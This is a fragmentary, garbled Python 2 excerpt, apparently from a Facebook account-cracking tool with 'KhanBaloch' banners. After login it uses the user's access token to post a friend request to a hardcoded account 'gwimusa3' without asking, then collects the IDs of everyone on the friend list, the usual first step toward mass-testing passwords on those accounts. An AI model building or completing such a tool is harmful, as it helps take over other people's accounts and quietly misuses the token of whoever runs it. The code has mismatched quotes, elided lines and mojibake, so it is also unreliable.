...
\033[1;94mKhanBaloch\033[1;91m: \033[1;91тЦТтЦУтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИ]99.9
...
def login():
	...
	try:
		...
		print "\033[1;95m      тЧетЧдтЧетЧдтЧетЧдтЧетЧдтЧетЧдтЧетЧдтАвтЧИтАв\033[1;96mKhanBaloch\033[1;95mтАвтЧИтАвтЧетЧдтЧетЧдтЧетЧдтЧетЧдтЧетЧдтЧетЧд"
		...
		if 'save-device' in url:
			try:
				...
				requests.post(/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
...
def pilih_super():
	...
	if peak =="":
		...
		r = requests.get/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
